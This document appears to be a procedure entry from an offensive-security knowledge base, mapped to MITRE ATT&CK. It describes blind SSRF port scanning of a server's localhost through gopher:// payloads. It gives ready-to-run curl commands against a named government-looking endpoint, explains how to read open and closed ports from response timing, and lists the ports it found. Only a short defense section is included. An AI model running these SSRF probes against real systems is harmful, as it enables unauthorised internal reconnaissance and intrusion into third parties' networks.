---
id: proc-uuid-5
tags:
  - port-scanning
  - ssrf
  - blind
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
updated_at: '2025-12-14T03:46:09.355Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
---
# Perform-Manual-Port-Scanning-via-SSRF

## Summary

This procedure uses blind SSRF with gopher protocol to manually scan internal ports by measuring response times and timeouts, distinguishing open ports (timeouts) from closed ones (fast responses) on the target's localhost.

## Description

Target the json_status endpoint with payloads like gopher://127.0.0.1:PORT/. Open ports like 25 and 443 cause connection timeouts (504), while closed like 8080 respond quickly (~150ms). In the AWS-hosted app, this reveals services like SMTP and HTTPS. Prerequisites: Vulnerable SSRF endpoint. Outcomes: Mapped open internal ports.

## Requirements

1. Access to send timed HTTP requests
2. Tools like curl with timing (e.g., --max-time)
3. List of ports to test (e.g., 25, 80, 443, 8080, 4445)

## Defense

Defensive measures and detection strategies:

- Implement request timeouts and rate limiting on SSRF endpoints.
- Block internal IP requests at the network level.
- Log response times for anomalies indicating scanning.

## Objectives

1. Test specific ports for openness.
2. Infer internal network topology.
3. Identify exploitable services.

## Instructions

### Step 1: Test Closed Port

**Context**: Send request to a known closed port for baseline response.

curl -w "%{time_total}" "https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445/"

> Expected: Fast response ~163ms, 200 OK.

### Step 2: Test Open Port

**Context**: Probe an open port to observe timeout.

curl -w "%{time_total}" --max-time 10 "https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A25/"

> Expected: Timeout, 504 error.

### Step 3: Iterate Ports

**Context**: Repeat for multiple ports, noting patterns.

Test 443 (timeout, open), 8080 (157ms, closed).

> Compile results: Open - 25,80,443; Closed - 8080,4445.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Network Service Scanning]] Network Service Scanning

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Reconnaissance]]
- [[timing-attack]]
